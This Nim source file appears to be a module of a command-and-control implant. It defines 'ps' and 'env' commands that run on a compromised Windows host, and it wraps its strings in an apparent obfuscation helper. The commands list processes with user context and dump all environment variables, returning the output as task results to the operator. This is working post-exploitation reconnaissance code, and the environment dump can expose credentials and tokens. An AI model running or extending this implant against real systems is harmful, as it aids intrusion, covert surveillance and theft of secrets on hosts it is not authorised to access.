import ../common/[types, utils]

# Declare function prototypes
proc executePs(ctx: AgentCtx, task: Task): TaskResult
proc executeEnv(ctx: AgentCtx, task: Task): TaskResult

# Module definition
let module* = Module(
    name: protect("systeminfo"),
    description: protect("Retrieve information about the target system and environment."),
    moduleType: MODULE_SITUATIONAL_AWARENESS,
    commands: @[
        Command(
            name: protect("ps"),
            commandType: CMD_PS,
            description: protect("Display running processes."),
            example: protect("ps"),
            arguments: @[],
            execute: executePs
        ),
        Command(
            name: protect("env"),
            commandType: CMD_ENV,
            description: protect("Display environment variables."),
            example: protect("env"),
            arguments: @[],
            execute: executeEnv
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executePs(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent): 

    import winim
    import os, strutils, strformat, tables, algorithm
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../agent/core/process

    proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
        
        print "   [>] Listing running processes."
        
        try: 
            var processes: seq[DWORD] = @[]
            var output: string = ""

            var procMap = processList() 

            # Create child-parent process relationships
            for pid, procInfo in procMap.mpairs():
                if procMap.contains(procInfo.ppid) and procInfo.ppid != 0:
                    procMap[procInfo.ppid].children.add(pid)
                else: 
                    processes.add(pid)

            # Add header row
            let headers = @[
                protect("PID"), 
                protect("PPID"), 
                protect("Process"), 
                protect("Session"), 
                protect("User context")
            ]
            
            output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<40}{headers[3]:<10}{headers[4]}" & "\n"
            output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(40) & "-".repeat(len(headers[3])).alignLeft(10) & "-".repeat(len(headers[4])) & "\n"

            # Format and print process
            proc printProcess(pid: DWORD, indentSpaces: int = 0) = 
                if not procMap.contains(pid): 
                    return
                
                var process = procMap[pid]
                let processName = " ".repeat(indentSpaces) & process.name
                output &= fmt"{$process.pid:<10}{$process.ppid:<10}{processName:<40}{$process.session:<10}{process.user}" & "\n"
                
                # Recursively print child processes with indentation
                process.children.sort()
                for childPid in process.children:
                    printProcess(childPid, indentSpaces + 2)
            
            # Iterate over root processes to construct the output
            processes.sort()
            for pid in processes: 
                printProcess(pid)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 

        print "   [>] Displaying environment variables."

        try: 
            var output: string = ""
            for key, value in envPairs(): 
               output &= fmt"{key}: {value}" & '\n'
               
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))